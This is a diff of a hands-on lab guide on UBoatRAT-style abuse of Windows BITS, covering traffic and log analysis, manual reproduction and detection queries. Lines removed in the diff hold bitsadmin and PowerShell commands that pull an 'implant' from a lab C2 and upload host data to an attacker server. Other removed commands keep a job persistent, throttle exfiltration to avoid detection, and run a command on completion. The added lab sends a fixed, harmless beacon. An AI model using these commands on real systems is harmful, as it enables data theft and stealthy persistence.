+- [ ] What purpose does `UBoatRAT_LAB.marker` serve?
 
 ---
 
-### Phase 7: Validating Host Artefacts in Procmon
+## Phase 6 — Analyze Network Activity
 
-Now that you know exactly what the BITS job was instructed to do and where the payload was staged (Phase 6), return to **Process Monitor** — which you stopped in Phase 3 — to find the forensic evidence left on disk and in the registry. Working with this context makes the search targeted: you know exactly what to look for.
+The expected network sequence is:
 
-**Step 1 — Isolate File System Writes:**
+```text
+1. BITS download:
+   GET /c2/trigger.dat over TCP/8080
 
-Since BITS operates asynchronously through the Windows Service Control Manager, the payload is not written by `WinSvcHelper.exe` itself. From Phase 6, you identified the intended destination path. Find the exact moment it was written.
+2. Callback resolver request:
+   GET /resolver/README.md over TCP/8080
 
-Press **CTRL+L** to open the filter menu. Click **Reset** to clear any previous filters, then configure the following:
+3. Fixed beacon:
+   TCP connection to port 9001
+```
 
-- `Operation` | `contains` | `Write` → Include
-- `Path` | `contains` | `ProgramData` → Include
+### Step 1 — Isolate the BITS transfer
 
-<img width="640" height="376" alt="image" src="https://github.com/user-attachments/assets/d075d8ab-0be7-4ab8-9441-5e621d487e29" />
+In Wireshark, apply:
 
-Apply the filter and examine the results.
+```text
+http.request.uri == "/c2/trigger.dat"
+```
 
-1. Which process is writing to the BITS database (`edb.log`) or the destination file inside `ProgramData`?
-2. Is there any write activity under `C:\Windows\System32\Tasks\` or `C:\ProgramData\`? Under which exact paths?
-3. Does the responsible process align with what you observed in Wireshark in Phase 5?
+Inspect:
 
-**Step 2 — Identify Registry Writes (Persistence):**
+- source and destination IP;
+- source and destination port;
+- HTTP method;
+- User-Agent;
+- Range headers;
+- response status;
+- transferred size.
 
-Malware needs to survive a reboot. Since `WinSvcHelper.exe` spawned a background PowerShell process (confirmed in Phase 4), investigate what that PowerShell instance changed in the registry to establish persistence.
+BITS may use HTTP Range requests. The server supports them to make the transfer observable and compatible.
 
-Change your filters (**CTRL+L**) by removing the previous rules and adding:
+<!-- SCREENSHOT PLACEHOLDER:
+Wireshark packet details for GET /c2/trigger.dat,
+including User-Agent and any Range header.
+-->
 
-- `Operation` | `contains` | `RegSetValue` → Include
-- `Process Name` | `is` | `powershell.exe` → Include
+### Step 2 — Isolate the resolver request
 
-Apply the filter and examine the `Path` column.
+Apply:
 
-1. Were any keys written under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\`?
-2. What is the name of the scheduled task created for persistence?
+```text
+http.request.uri == "/resolver/README.md"
+```
 
->[!NOTE]
-> Registry writes under the Schedule key indicate a scheduled task was created programmatically. Note the task name — you will cross-reference it in Part II as the persistence mechanism layered on top of BITS.
+Follow the HTTP stream.
 
-**Before proceeding, document your answers:**
+Record:
 
-- [ ] What process is physically responsible for writing BITS data to the disk?
-- [ ] What files were created and where?
-- [ ] Was a scheduled task created? What is its exact name?
+- User-Agent;
+- response body;
+- `[Rudeltaktik]` marker;
+- Base64 value.
+
+The resolver request is made by the callback simulator and uses:
+
+```text
+UBoatRAT-Lab-Simulator/1.0
+```
+
+This distinguishes it from the BITS transfer.
+
+<!-- SCREENSHOT PLACEHOLDER:
+Follow HTTP Stream output for /resolver/README.md.
+-->
+
+### Step 3 — Inspect the TCP/9001 connection
+
+Apply:
+
+```text
+tcp.port == 9001
+```
+
+Follow the TCP stream or export the client payload as raw bytes.
+
+The bytes are not plaintext because each byte is XORed with `0x88`.
+
+The server does not send an application-layer response.
+
+### Step 4 — Query Sysmon Event ID 3
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Sysmon/Operational"
+  Id        = 3
+  StartTime = $SessionStart
+} |
+  ForEach-Object {
+    $Xml = [xml]$_.ToXml()
+    $Data = $Xml.Event.EventData.Data
+
+    [pscustomobject]@{
+      Time                = $_.TimeCreated
+      Image               = ($Data | Where-Object Name -eq "Image")."#text"
+      SourceIp            = ($Data | Where-Object Name -eq "SourceIp")."#text"
+      DestinationIp       = ($Data | Where-Object Name -eq "DestinationIp")."#text"
+      DestinationHostname = ($Data | Where-Object Name -eq "DestinationHostname")."#text"
+      DestinationPort     = ($Data | Where-Object Name -eq "DestinationPort")."#text"
+      ProcessGuid         = ($Data | Where-Object Name -eq "ProcessGuid")."#text"
+    }
+  } |
+  Sort-Object Time |
+  Format-Table -AutoSize -Wrap
+```
+
+### Questions
+
+- [ ] Which request was generated by BITS?
+- [ ] Which request was generated by the callback simulator?
+- [ ] Which process connected to TCP/9001?
+- [ ] Did the Ubuntu server send any commands or payloads back?
+- [ ] What evidence proves this is a one-way beacon rather than an interactive channel?
 
 ---
 
-### Phase 8: Evidence Summary — The Discovery
+## Phase 7 — Analyze the BITS Job
 
-You now have corroborating evidence from four independent sources — process activity (Procmon), network traffic (Wireshark), process tree (Process Explorer), and the BITS Operational log. Synthesise your findings before moving to Part II.
+### Step 1 — Inspect the live queue
 
-| Question | Your Finding |
-|---|---|
-| What process started the execution chain? | |
-| What child process was spawned? | |
-| What persistence mechanism was established? | |
-| What Windows service was used for all file transfers? | |
-| What C2 IP and port were contacted? | |
-| What was downloaded from the C2? | |
-| Was data exfiltrated? What? | |
-| What User-Agent string confirmed the transfer service? | |
+```powershell
+Get-BitsTransfer -AllUsers |
+  Where-Object {
+    $_.DisplayName -eq "UBoatLab_Persistence"
+  } |
+  Format-List *
+```
 
-**The Discovery:**
+Also inspect:
 
-The suspicious file uses **Background Intelligent Transfer Service (BITS)** — a built-in, trusted Windows component — to perform both inbound transfers (pulling from a C2 server) and outbound transfers (exfiltrating data), while routing all network activity through `svchost.exe`. The binary itself makes no direct network connection.
+```powershell
+bitsadmin /getinfo "UBoatLab_Persistence" /verbose
+```
 
-This is **MITRE ATT&CK T1197 — BITS Jobs**. It matches the documented behavior of UBoatRAT. You arrived at this conclusion through evidence, not by being told.
+Depending on the current state and Windows build, the job may be transferred, acknowledged, completed, or retained for notification behavior.
+
+### Step 2 — Query the BITS Operational log
+
+First, enumerate all BITS events from this session without assuming event IDs:
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Bits-Client/Operational"
+  StartTime = $SessionStart
+} |
+  Sort-Object TimeCreated |
+  Select-Object TimeCreated, Id,
+    @{Name="Summary"; Expression={
+      ($_.Message -split "\r?\n" |
+        Select-Object -First 4) -join " | "
+    }} |
+  Format-Table -AutoSize -Wrap
+```
+
+During the dry run, identify the event IDs that represent:
+
+- job creation;
+- transfer start;
+- transfer completion;
+- notification execution;
+- errors or retries.
+
+> [!NOTE]
+> Current Windows builds commonly produce transfer-related BITS Operational events such as IDs 59 and 60, but the final screenshots and event-specific instructions should be confirmed against the actual VM build used by the platform.
+
+### Step 3 — Search by job name
+
+```powershell
+Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Bits-Client/Operational"
+  StartTime = $SessionStart
+} |
+  Where-Object {
+    $_.Message -match "UBoatLab_Persistence"
+  } |
+  Sort-Object TimeCreated |
+  Format-List TimeCreated, Id, Message
+```
+
+### Questions
+
+- [ ] What is the BITS job name?
+- [ ] What is its transfer type?
+- [ ] What remote URL was registered?
+- [ ] What local destination was registered?
+- [ ] What callback program and arguments were registered?
+- [ ] Which BITS events correspond to the transfer lifecycle on this VM build?
+
+<!-- SCREENSHOT PLACEHOLDER:
+Event Viewer or PowerShell showing the BITS job lifecycle for UBoatLab_Persistence.
+-->
 
 ---
 
-## PART II — TECHNIQUE REPRODUCTION
+## Phase 8 — Decode the Resolver and Beacon
 
-*You are now a red team operator. You know the technique. Reproduce it manually, step by step, so that you understand the exact mechanism — not just the name.*
-
-*The C2 server you started in Phase 1 is still running. Files are available for download under `/c2/` and HTTP PUT uploads are accepted at `/upload/` on port 8080.*
-
----
-
-### Phase 9: BITS Download (C2 Pull)
-
-Restart your Wireshark capture with filter `ip.addr == <UBUNTU_IP>` before beginning this phase. You want to observe each BITS operation in isolation.
-
-**Step 1 — Create and execute a download job using bitsadmin:**
+### Step 1 — Inspect the saved resolver
 
 ```powershell
-# Create the job (state: SUSPENDED)
-bitsadmin /create /download "C2_Pull"
+$ResolverContent = Get-Content `
+  .\runtime\resolver_response.txt `
+  -Raw
 
-# Register the file to transfer
-bitsadmin /addfile "C2_Pull" "http://<UBUNTU_IP>:8080/c2/implant.dat" "C:\Users\Public\implant.dat"
-
-# Inspect the job before starting — note the state, URL, and local path
-bitsadmin /getinfo "C2_Pull"
-
-# Start the transfer
-bitsadmin /resume "C2_Pull"
-
-# Poll state — repeat until TRANSFERRED
-Start-Sleep -Seconds 3
-bitsadmin /getinfo "C2_Pull"
+$ResolverContent
 ```
 
-Once the state reads **TRANSFERRED**, finalise:
+Extract and decode the Base64 value:
 
 ```powershell
-# Complete — moves the file from the BITS staging area to the declared destination path
-bitsadmin /complete "C2_Pull"
+$Match = [regex]::Match(
+  $ResolverContent,
+  "\[Rudeltaktik\](?<Value>[A-Za-z0-9+/=]+)!"
+)
 
-# Verify
-Get-Item "C:\Users\Public\implant.dat"
+if (-not $Match.Success) {
+  throw "Resolver marker not found."
+}
+
+$DecodedEndpoint = [Text.Encoding]::ASCII.GetString(
+  [Convert]::FromBase64String(
+    $Match.Groups["Value"].Value
+  )
+)
+
+$DecodedEndpoint
 ```
 
-**Step 2 — Repeat using PowerShell's Start-BitsTransfer:**
+Expected format:
+
+```text
+<UBUNTU_PRIVATE_IP>:9001
+```
+
+### Step 2 — Decode captured beacon bytes
+
+Export the client payload from the TCP/9001 stream as raw bytes, or use the Ubuntu log to confirm receipt.
+
+Given a raw byte array named `$EncodedBeacon`:
 
 ```powershell
-# Synchronous — blocks until complete
-Start-BitsTransfer `
-  -Source      "http://<UBUNTU_IP>:8080/c2/config.dat" `
-  -Destination "C:\Users\Public\config.dat"
+$DecodedBytes = New-Object byte[] $EncodedBeacon.Length
 
-# Asynchronous — returns immediately; job runs in background
-$job = Start-BitsTransfer `
-  -Source      "http://<UBUNTU_IP>:8080/c2/beacon.dat" `
-  -Destination "C:\Users\Public\beacon.dat" `
-  -Asynchronous
+for ($Index = 0; $Index -lt $EncodedBeacon.Length; $Index++) {
+  $DecodedBytes[$Index] = $EncodedBeacon[$Index] -bxor 0x88
+}
 
-# Monitor and finalise
-$job | Get-BitsTransfer
-$job | Complete-BitsTransfer
+[Text.Encoding]::ASCII.GetString($DecodedBytes)
 ```
 
-**Step 3 — Observe in Wireshark:**
+Expected result:
 
-Confirm that:
-
-- HTTP traffic appeared with `svchost.exe` as the source process (verify in Process Explorer → TCP/IP tab)
-- The User-Agent reads `Microsoft BITS/X.X`
-- The URI path matches exactly what you specified in `/addfile` or `-Source`
-
-This is mechanically identical to the traffic you observed in Phase 5. The connection between discovery and reproduction is now direct and visible.
-
----
-
-### Phase 10: BITS Upload (Exfiltration)
-
-The Ubuntu server accepts HTTP PUT requests at `/upload/` on port 8080.
-
-**Step 1 — Prepare a file to exfiltrate:**
-
-```powershell
-"Hostname: $env:COMPUTERNAME`nUser: $env:USERNAME`nDate: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" |
-  Out-File "C:\Users\Public\sensitive.txt" -Encoding UTF8
+```text
+488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL
 ```
 
-**Step 2 — Upload using bitsadmin:**
+### Step 3 — Inspect Ubuntu evidence
 
-```powershell
-bitsadmin /create /upload "Exfil_Job"
-bitsadmin /addfile "Exfil_Job" "http://<UBUNTU_IP>:8080/upload/sensitive.txt" "C:\Users\Public\sensitive.txt"
-bitsadmin /resume "Exfil_Job"
-
-Start-Sleep -Seconds 5
-bitsadmin /getinfo "Exfil_Job"
-bitsadmin /complete "Exfil_Job"
-```
-
-**Step 3 — Verify receipt on the Ubuntu server:**
-
-Switch to the **Ubuntu terminal**:
+On Ubuntu:
 
 ```bash
-cat ~/BnB/UBoatRAT/uploads/sensitive.txt
+cat ~/BnB/UBoatRAT/logs/server.log
+cat ~/BnB/UBoatRAT/logs/beacon.log
 ```
 
-Your hostname and username are now visible on the attacker-controlled server.
+<!-- SCREENSHOT PLACEHOLDER:
+Ubuntu beacon.log showing the validated fixed beacon.
+-->
 
-**Step 4 — Repeat with PowerShell:**
+### Questions
 
-```powershell
-Start-BitsTransfer `
-  -Source       "C:\Users\Public\sensitive.txt" `
-  -Destination  "http://<UBUNTU_IP>:8080/upload/sensitive_v2.txt" `
-  -TransferType Upload
-```
-
->[!NOTE]
-> BITS upload requires the receiving server to support HTTP PUT on the target path. The Ubuntu setup script configures this. In documented UBoatRAT campaigns, files were staged locally and transferred via BITS upload to an attacker-controlled HTTP listener — structurally identical to what you just performed.
+- [ ] What endpoint did the dead-drop resolver contain?
+- [ ] Why is the resolver value encoded rather than stored as plaintext?
+- [ ] What XOR key was used?
+- [ ] What did the beacon decode to?
+- [ ] What data about the Windows host was included?
+- [ ] Did the client read a response?
 
 ---
 
-### Phase 11: BITS Stealth and Persistence Properties
+## Phase 9 — Evidence Summary
 
-This phase deliberately examines the properties that make BITS valuable to attackers beyond basic file transfer — the same properties that made the Part I simulation difficult to immediately characterise.
+Complete the table before moving to manual reproduction.
 
-**Step 1 — Job persistence (survives reboot without a registry key):**
-
-```powershell
-# Create a job but leave it in a deferred state
-bitsadmin /create /download "PersistentBeacon"
-bitsadmin /addfile "PersistentBeacon" "http://<UBUNTU_IP>:8080/c2/beacon.dat" "C:\ProgramData\beacon.dat"
-bitsadmin /setretrydelay "PersistentBeacon" 60
-bitsadmin /resume "PersistentBeacon"
-bitsadmin /suspend "PersistentBeacon"
-
-# Confirm the job is registered
-bitsadmin /list /allusers /verbose
-```
-
-This job is now persistent. The BITS service will attempt to resume it after the next system reboot — with no registry run key, no startup folder entry, and no task scheduler involvement. Persistence is implicit in the job registration itself.
-
-```powershell
-# Cancel before moving on
-bitsadmin /cancel "PersistentBeacon"
-```
-
-**Step 2 — Priority manipulation (throttled, low-visibility exfiltration):**
-
-```powershell
-bitsadmin /create /upload "LowPriorityExfil"
-bitsadmin /addfile "LowPriorityExfil" "http://<UBUNTU_IP>:8080/upload/throttled.txt" "C:\Users\Public\sensitive.txt"
-bitsadmin /setpriority "LowPriorityExfil" LOW
-bitsadmin /resume "LowPriorityExfil"
-bitsadmin /getinfo "LowPriorityExfil"
-```
-
-A LOW-priority BITS job transfers only when the network interface is otherwise idle. The exfiltration completes eventually but never appears as a bandwidth spike — a common detection heuristic it cleanly sidesteps.
-
-```powershell
-bitsadmin /cancel "LowPriorityExfil"
-```
-
-**Step 3 — Callback execution on completion:**
-
-```powershell
-bitsadmin /create /download "CallbackJob"
-bitsadmin /addfile "CallbackJob" "http://<UBUNTU_IP>:8080/c2/next_stage.dat" "C:\ProgramData\next_stage.dat"
-
-# Register a command to execute silently when the transfer finishes
-bitsadmin /setnotifycmdline "CallbackJob" "cmd.exe" "/c echo BITS_CALLBACK_FIRED >> C:\Users\Public\bits_callback.log"
-
-bitsadmin /resume "CallbackJob"
-```
-
-Wait for the transfer to complete, then verify:
-
-```powershell
-Get-Content "C:\Users\Public\bits_callback.log"
-```
-
-The callback executed silently, triggered by the BITS service at transfer completion — no scheduled task, no registry run key, no visible mechanism. This is how malware can chain a BITS download directly into payload execution without leaving an additional persistence artefact.
-
-**Step 4 — Enumerate and clean up all jobs from this phase:**
-
-```powershell
-Get-BitsTransfer -AllUsers | Format-Table DisplayName, JobState, TransferType, BytesTotal
-
-# Cancel any remaining jobs
-Get-BitsTransfer -AllUsers | Remove-BitsTransfer
-```
-
----
-
-### Phase 12: Connecting Part I to Part II
-
-Before moving to detection, map each observation from the Part I behavioural analysis to the technique you reproduced in Part II:
-
-| Observation (Part I — Discovery) | Technique (Part II — Reproduction) |
+| Question | Finding |
 |---|---|
-| BITS download job created by simulation | Phase 9: `bitsadmin /create /download` |
-| HTTP GET from `svchost.exe` to Ubuntu IP | Phase 9: svchost.exe visible in Wireshark and Process Explorer during transfer |
-| User-Agent: `Microsoft BITS/X.X` | Phase 9, 10: inherent to all BITS transfers regardless of which process creates the job |
-| File written to `C:\ProgramData\` | Phase 9: `bitsadmin /complete` moves from staging to declared destination |
-| BITS upload job for outbound data | Phase 10: `bitsadmin /create /upload` |
-| Job retried without user interaction | Phase 11: `setretrydelay` + suspended job lifecycle |
-| Callback execution at download completion | Phase 11: `setnotifycmdline` |
-| Scheduled task written to registry (persistence) | Layered mechanism above BITS — observed in Phase 7 Step 2 |
+| Initial executable | |
+| Direct child process | |
+| BITS utility used | |
+| BITS job name | |
+| Remote trigger URL | |
+| Local trigger destination | |
+| Callback executable | |
+| Callback arguments | |
+| Resolver URL | |
+| Decoded resolver endpoint | |
+| Beacon destination | |
+| XOR key | |
+| Decoded beacon | |
+| Data collected from the endpoint | |
+| Response or command channel observed | |
 
-Every artefact you found in Part I has a direct, reproducible equivalent in Part II. The discovery and the reproduction are the same mechanism observed from opposite sides.
+### Behavioral conclusion
+
+The simulator creates a BITS download job and registers a completion callback. The BITS service retrieves an inert trigger file from the Ubuntu VM and launches a copy of the simulator named `svchost.exe` from a user-writable runtime directory.
+
+The callback retrieves a controlled dead-drop resolver, validates the private endpoint, and sends one fixed XOR-encoded beacon. It does not collect endpoint data, upload files, receive commands, or maintain an interactive connection.
 
 ---
 
-## PART III — DETECTION ENGINEERING
+# PART II — MANUAL TECHNIQUE REPRODUCTION
 
-*You are now a detection engineer. Build the rules that would have caught this at the earliest possible point in the kill chain.*
+*You are now the red team operator. Reproduce the individual mechanisms without running the simulator again.*
 
 ---
 
-### Phase 13: BITS Operational Log — Event ID Mapping
+## Phase 10 — Reproduce a BITS Download
 
-The BITS Operational log is the most specific and targeted source for this technique. It requires no additional tooling — it is built into Windows.
+Use a distinct manual job name:
 
-**Step 1 — Query all relevant events from the lab session:**
+```text
+UBoatLab_ManualDownload
+```
+
+Prepare the destination:
 
 ```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 500 |
-  Where-Object { $_.Id -in @(3, 4, 59, 60, 16) } |
+New-Item .\runtime -ItemType Directory -Force |
+  Out-Null
+
+Remove-Item .\runtime\manual_trigger.dat `
+  -Force `
+  -ErrorAction SilentlyContinue
+```
+
+Remove only a previous copy of this specific manual job:
+
+```powershell
+Get-BitsTransfer -AllUsers |
+  Where-Object {
+    $_.DisplayName -eq "UBoatLab_ManualDownload"
+  } |
+  Remove-BitsTransfer
+```
+
+Create the job:
+
+```powershell
+bitsadmin /create /download "UBoatLab_ManualDownload"
+```
+
+Register the file:
+
+```powershell
+bitsadmin /addfile `
+  "UBoatLab_ManualDownload" `
+  "http://uboat-c2.test:8080/c2/trigger.dat" `
+  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_trigger.dat"
+```
+
+Inspect before starting:
+
+```powershell
+bitsadmin /getinfo "UBoatLab_ManualDownload" /verbose
+```
+
+Start:
+
+```powershell
+bitsadmin /resume "UBoatLab_ManualDownload"
+```
+
+Poll:
+
+```powershell
+Start-Sleep -Seconds 3
+
+bitsadmin /getinfo "UBoatLab_ManualDownload" /verbose
+```
+
+When the job reaches a transferable completion state:
+
+```powershell
+bitsadmin /complete "UBoatLab_ManualDownload"
+```
+
+Verify:
+
+```powershell
+Get-Item .\runtime\manual_trigger.dat
+```
+
+<!-- SCREENSHOT PLACEHOLDER:
+bitsadmin output showing the manual download job, URL, local path, and final state.
+-->
+
+### Questions
+
+- [ ] Which process performed the network transfer?
+- [ ] Did the HTTP request use the same User-Agent as the simulator-created BITS job?
+- [ ] Which BITS events appeared for the manual job?
+- [ ] Which process wrote `manual_trigger.dat`?
+
+---
+
+## Phase 11 — Reproduce BITS Callback Execution
+
+Use:
+
+```text
+UBoatLab_ManualCallback
+```
+
+Clean only the matching job and artifact:
+
+```powershell
+Get-BitsTransfer -AllUsers |
+  Where-Object {
+    $_.DisplayName -eq "UBoatLab_ManualCallback"
+  } |
+  Remove-BitsTransfer
+
+Remove-Item .\runtime\manual_callback_trigger.dat `
+  -Force `
+  -ErrorAction SilentlyContinue
+
+Remove-Item .\runtime\manual_callback.log `
+  -Force `
+  -ErrorAction SilentlyContinue
+```
+
+Create the download job:
+
+```powershell
+bitsadmin /create /download "UBoatLab_ManualCallback"
+```
+
+Register the trigger:
+
+```powershell
+bitsadmin /addfile `
+  "UBoatLab_ManualCallback" `
+  "http://uboat-c2.test:8080/c2/trigger.dat" `
+  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_callback_trigger.dat"
+```
+
+Register a harmless callback:
+
+```powershell
+bitsadmin /setnotifycmdline `
+  "UBoatLab_ManualCallback" `
+  "C:\Windows\System32\cmd.exe" `
+  '/d /c echo MANUAL_BITS_CALLBACK >> "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime\manual_callback.log"'
+```
+
+Inspect:
+
+```powershell
+bitsadmin /getinfo "UBoatLab_ManualCallback" /verbose
+```
+
+Resume:
+
+```powershell
+bitsadmin /resume "UBoatLab_ManualCallback"
+```
+
+Wait:
+
+```powershell
+Start-Sleep -Seconds 10
+```
+
+Verify:
+
+```powershell
+Get-Content .\runtime\manual_callback.log
+```
+
+Expected:
+
+```text
+MANUAL_BITS_CALLBACK
+```
+
+<!-- SCREENSHOT PLACEHOLDER:
+manual_callback.log and relevant process/event evidence showing cmd.exe launched by the BITS workflow.
+-->
+
+### Questions
+
+- [ ] Which command was registered with `SetNotifyCmdLine`?
+- [ ] Did the callback run as a direct child of your PowerShell process?
+- [ ] Which telemetry source best proves that the callback executed?
+- [ ] Why is callback execution more important than the inert file itself?
+
+---
+
+## Phase 12 — Reproduce Resolver Decoding
+
+Retrieve the resolver manually:
+
+```powershell
+$ResolverResponse = Invoke-WebRequest `
+  -Uri "http://uboat-c2.test:8080/resolver/README.md" `
+  -UseBasicParsing `
+  -TimeoutSec 5
+
+$ResolverResponse.Content
+```
+
+Extract and decode:
+
+```powershell
+$Match = [regex]::Match(
+  $ResolverResponse.Content,
+  "\[Rudeltaktik\](?<Value>[A-Za-z0-9+/=]+)!"
+)
+
+if (-not $Match.Success) {
+  throw "Resolver format is invalid."
+}
+
+$Endpoint = [Text.Encoding]::ASCII.GetString(
+  [Convert]::FromBase64String(
+    $Match.Groups["Value"].Value
+  )
+)
+
+$Endpoint
+```
+
+Split the endpoint:
+
+```powershell
+$EndpointParts = $Endpoint -split ":", 2
+
+$BeaconIp = $EndpointParts[0]
+$BeaconPort = [int]$EndpointParts[1]
+
+[pscustomobject]@{
+  Address = $BeaconIp
+  Port    = $BeaconPort
+}
+```
+
+Validate that the address is RFC1918:
+
+```powershell
+$ParsedIp = [Net.IPAddress]::Parse($BeaconIp)
+$Octets = $ParsedIp.GetAddressBytes()
+
+$IsPrivate = (
+  $Octets[0] -eq 10 -or
+  (
+    $Octets[0] -eq 172 -and
+    $Octets[1] -ge 16 -and
+    $Octets[1] -le 31
+  ) -or
+  (
+    $Octets[0] -eq 192 -and
+    $Octets[1] -eq 168
+  )
+)
+
+if (-not $IsPrivate) {
+  throw "Decoded address is not RFC1918."
+}
+
+if ($BeaconPort -ne 9001) {
+  throw "Unexpected beacon port."
+}
+```
+
+---
+
+## Phase 13 — Reproduce the Fixed XOR Beacon
+
+Build the exact fixed plaintext:
+
+```powershell
+$BeaconText = (
+  "488|UBOATRAT_LAB|" +
+  "BENIGN_BEACON|" +
+  "NO_COMMAND_CHANNEL"
+)
+
+$PlainBytes = [Text.Encoding]::ASCII.GetBytes(
+  $BeaconText
+)
+```
+
+XOR each byte:
+
+```powershell
+$EncodedBytes = New-Object byte[] $PlainBytes.Length
+
+for ($Index = 0; $Index -lt $PlainBytes.Length; $Index++) {
+  $EncodedBytes[$Index] = (
+    $PlainBytes[$Index] -bxor 0x88
+  )
+}
+```
+
+Send the fixed message to the decoded private endpoint:
+
+```powershell
+$Client = New-Object Net.Sockets.TcpClient
+
+try {
+  $Client.Connect($BeaconIp, $BeaconPort)
+
+  $Stream = $Client.GetStream()
+
+  try {
+    $Stream.Write(
+      $EncodedBytes,
+      0,
+      $EncodedBytes.Length
+    )
+
+    $Stream.Flush()
+  }
+  finally {
+    $Stream.Dispose()
+  }
+}
+finally {
+  $Client.Dispose()
+}
+```
+
+Do not wait for or parse a response. The Ubuntu server does not provide one.
+
+Confirm on Ubuntu:
+
+```bash
+tail -n 20 ~/BnB/UBoatRAT/logs/beacon.log
+```
+
+### Questions
+
+- [ ] How many bytes were transmitted?
+- [ ] Why is XOR encoding not encryption?
+- [ ] What makes this reproduction incapable of carrying arbitrary data?
+- [ ] What prevents it from becoming an interactive command channel?
+
+---
+
+## Phase 14 — Compare Automated and Manual Behavior
+
+| Automated observation | Manual reproduction |
+|---|---|
+| `UBoatLab_Persistence` BITS job | `UBoatLab_ManualDownload` |
+| BITS download of `/c2/trigger.dat` | Manual `/addfile` and `/resume` |
+| `SetNotifyCmdLine` launches `runtime\svchost.exe` | Manual harmless `cmd.exe` callback |
+| Callback retrieves `/resolver/README.md` | `Invoke-WebRequest` resolver retrieval |
+| Base64 endpoint decoded | Manual Base64 decoding |
+| XOR-encoded fixed beacon | Manual XOR loop and TCP write |
+
+Explain:
+
+- what behavior belongs to BITS;
+- what behavior belongs to the callback;
+- what behavior belongs to the resolver;
+- what behavior belongs to the TCP beacon;
+- which artifacts are implementation details of the simulator rather than intrinsic BITS behavior.
+
+---
+
+# PART III — DETECTION ENGINEERING
+
+*You are now the detection engineer. Build layered detections that do not depend on one event source.*
+
+---
+
+## Phase 15 — BITS Operational Detection
+
+Query events from the session:
+
+```powershell
+$BitsEvents = Get-WinEvent -FilterHashtable @{
+  LogName   = "Microsoft-Windows-Bits-Client/Operational"
+  StartTime = $SessionStart
+}
+
+$BitsEvents |
   Sort-Object TimeCreated |
   Select-Object TimeCreated, Id,
-    @{N='Summary'; E={ ($_.Message -split '\r?\n' | Select-Object -First 2) -join ' | ' }} |
+    @{Name="Summary"; Expression={
+      ($_.Message -split "\r?\n" |
+        Select-Object -First 4) -join " | "
+    }} |
   Format-Table -AutoSize -Wrap
 ```
 
-**Step 2 — Extract structured transfer details from Event ID 59:**
+Search for the three known lab job names:
 
 ```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" |
-  Where-Object { $_.Id -eq 59 } |
-  ForEach-Object {
-    $xml  = [xml]$_.ToXml()
-    $data = $xml.Event.EventData.Data
-    [PSCustomObject]@{
-      Time       = $_.TimeCreated
-      JobName    = ($data | Where-Object { $_.Name -eq 'name' }).'#text'
-      RemoteUrl  = ($data | Where-Object { $_.Name -eq 'url' }).'#text'
-      LocalFile  = ($data | Where-Object { $_.Name -eq 'localName' }).'#text'
-      BytesTotal = ($data | Where-Object { $_.Name -eq 'bytesTotal' }).'#text'
-    }
-  } | Format-Table -AutoSize -Wrap
-```
-
-**Step 3 — Identify the detection signal:**
-
-Answer before continuing:
-
-1. Which Event ID fires at the moment a malicious BITS job begins transferring?
-2. Which structured field in that event contains the C2 server address?
-3. What property distinguishes a malicious BITS URL from a Windows Update URL in this log?
-
->[!NOTE]
-> The distinguishing property is `RemoteUrl` in Event ID 59. Windows Update BITS jobs use hostnames under `*.windowsupdate.microsoft.com`, `*.download.windowsupdate.com`, and `*.delivery.mp.microsoft.com`. A job using a raw IP address, a non-standard port, or an unknown domain is immediately actionable. In a production environment, build an allowlist of your environment's legitimate BITS URLs before writing exclusion logic.
-
-**Event ID reference:**
-
-| ID | Meaning | Detection Value |
-|---|---|---|
-| 3 | New BITS job created | Low — fires on all jobs including Windows Update |
-| 4 | BITS job modified | Low — follow-up to job creation |
-| 59 | BITS transfer started | **High** — contains remote URL, ideal filter point |
-| 60 | BITS transfer completed | Medium — confirms successful transfer |
-| 16 | BITS transfer error / retry | Medium — repeated errors to a suspicious IP are a signal |
-
----
-
-### Phase 14: Sysmon Event Analysis
-
-Sysmon provides a second, independent detection layer that correlates BITS activity with process and network context — catching it through a different lens than the BITS log alone.
-
-**Step 1 — Network connections from svchost.exe (Event ID 3):**
-
-```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where-Object { $_.Id -eq 3 } |
-  ForEach-Object {
-    $xml  = [xml]$_.ToXml()
-    $data = $xml.Event.EventData.Data
-    [PSCustomObject]@{
-      Time         = $_.TimeCreated
-      Image        = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
-      DestIP       = ($data | Where-Object { $_.Name -eq 'DestinationIp' }).'#text'
-      DestPort     = ($data | Where-Object { $_.Name -eq 'DestinationPort' }).'#text'
-      DestHostname = ($data | Where-Object { $_.Name -eq 'DestinationHostname' }).'#text'
-    }
+$BitsEvents |
+  Where-Object {
+    $_.Message -match (
+      "UBoatLab_Persistence|" +
+      "UBoatLab_ManualDownload|" +
+      "UBoatLab_ManualCallback"
+    )
   } |
-  Where-Object { $_.Image -like '*svchost*' -and $_.DestPort -in @('80','8080','443') } |
-  Format-Table -AutoSize
-```
-
-Detection signal: `svchost.exe` connecting to an IP that does not resolve to a Microsoft or known-vendor hostname.
-
-**Step 2 — Process creation for bitsadmin.exe (Event ID 1):**
-
-```powershell
-Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
-  Where-Object { $_.Id -eq 1 } |
-  ForEach-Object {
-    $xml  = [xml]$_.ToXml()
-    $data = $xml.Event.EventData.Data
-    [PSCustomObject]@{
-      Time        = $_.TimeCreated
-      Image       = ($data | Where-Object { $_.Name -eq 'Image' }).'#text'
-      CommandLine = ($data | Where-Object { $_.Name -eq 'CommandLine' }).'#text'
-      ParentImage = ($data | Where-Object { $_.Name -eq 'ParentImage' }).'#text'
-    }
-  } |
-  Where-Object { $_.Image -like '*bitsadmin*' } |
-  Format-Table -AutoSize -Wrap
-```
-
-Detection signal: `bitsadmin.exe` executing on any endpoint that has no documented administrative use case for it.
-
